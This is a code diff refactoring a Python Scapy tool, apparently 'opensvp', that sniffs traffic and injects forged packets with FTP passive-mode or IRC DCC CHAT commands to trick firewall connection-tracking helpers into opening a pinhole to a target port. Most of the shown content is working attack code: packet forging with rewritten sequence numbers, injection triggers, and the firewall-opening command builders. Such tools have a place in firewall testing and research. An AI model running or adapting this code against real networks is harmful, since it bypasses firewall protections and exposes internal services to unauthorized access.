@@ -31,19 +31,22 @@ class attack_target:
         self.ip = "192.168.2.2"
         self.port = "5432"
         self.iface="eth0"
-        self.sent = 0
         self.verbose = False
 
-class ftp_helper(attack_target):
-    def build_command(self):
-        return "227 Entering Passive Mode (%s,%d,%d)\r\n" % (self.ip.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)
-
     def build_filter(self):
-        return "tcp and src host %s and src port 21" % (self.ip)
+        return ""
+
+    def build_command(self):
+        return ""
+
+    def inject_condition(self,pkt):
+        if pkt[TCP].flags & 8 != 0:
+            return True
+        return False
 
     def server_callback(self, pkt):
-        # match for login ok
-        if self.sent == 0 and re.match("230",pkt.sprintf("%TCP.payload%")):
+        # any packet is ok
+        if self.inject_condition(pkt):
             if self.verbose:
                 print "Working on following base"
                 print pkt.show()
@@ -66,11 +69,43 @@ class ftp_helper(attack_target):
                 sendp(att, iface=self.iface)
             else:
                 sendp(att, iface=self.iface, verbose=0)
-            self.sent = 1
-            self.cv.acquire()
-            self.cv.notify()
-            self.cv.release()
+            self.cleanup()
             sys.exit(0)
+
+    def initialize(self):
+        return None
+
+    def cleanup(self):
+        return None
+
+    def run(self):
+        self.initialize()
+        try:
+            sniff(iface=self.iface, prn=self.server_callback, filter=self.build_filter(), store=0, timeout=20)
+        except:
+            sys.stderr.write("Unable to sniff on interface\n")
+
+class ftp_helper(attack_target):
+    def build_command(self):
+        return "227 Entering Passive Mode (%s,%d,%d)\r\n" % (self.ip.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)
+
+    def build_filter(self):
+        return "tcp and src host %s and src port 21" % (self.ip)
+
+    def inject_condition(self,pkt):
+        if re.match("230",pkt.sprintf("%TCP.payload%")):
+            return True
+        return False
+
+    def initialize(self):
+        self.cv = threading.Condition()
+        conn = threading.Thread(None, self.ftp_connect, args=(self,))
+        conn.start()
+
+    def cleanup(self):
+        self.cv.acquire()
+        self.cv.notify()
+        self.cv.release()
           
     def ftp_connect(self, option=''):
         self.cv.acquire()
@@ -86,15 +121,6 @@ class ftp_helper(attack_target):
             sys.exit(0)
         self.cv.wait()
         self.cv.release()
-
-    def run(self):
-        self.cv = threading.Condition()
-        conn = threading.Thread(None, self.ftp_connect, args=(self,))
-        conn.start()
-        try:
-            sniff(iface=self.iface, prn=self.server_callback, filter=self.build_filter(), store=0, timeout=20)
-        except:
-            sys.stderr.write("Unable to sniff on interface\n")
         
 class irc_helper(attack_target):
     def ipnumber(self, ip):
@@ -107,41 +133,6 @@ class irc_helper(attack_target):
         return 'PRIVMSG opensvp :\x01DCC CHAT CHAT %d %d\x01\r\n' % (self.ipnumber(self.ip), self.port)
     def build_filter(self):
         return "tcp and src host %s and dst port 6667" % (self.ip)
-
-    def server_callback(self, pkt):
-        # any packet is ok
-        if self.sent == 0 and pkt[TCP].flags & 8 != 0:
-            if self.verbose:
-                print "Working on following base"
-                print pkt.show()
-            # set ether pkt src as dst
-            orig_src = pkt[Ether].src
-            orig_dst = pkt[Ether].dst
-            # change payload
-            att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP()/TCP()
-            att[IP] = pkt[IP]
-            att[IP].id = pkt[IP].id + 1
-            del att[IP].chksum
-            del att[IP].len
-            att[TCP].seq = pkt[TCP].seq + len(pkt[TCP].payload)
-            del att[TCP].chksum
-            att[TCP].payload = self.build_command()
-            # send packet
-            if self.verbose:
-                print "Sending attack packet"
-                print att.show()
-                sendp(att, iface=self.iface)
-            else:
-                sendp(att, iface=self.iface, verbose=0)
-            self.sent = 1
-            sys.exit(0)
-
-    def run(self):
-        try:
-            sniff(iface=self.iface, prn=self.server_callback, filter=self.build_filter(), store=0, timeout=20)
-        except:
-            sys.stderr.write("Unable to sniff on interface\n")
-
 
 parser = argparse.ArgumentParser(description='Open selected pin hole in firewall')
 parser.add_argument('-t', '--target', default='192.168.2.2', help='IP address of target to attack')
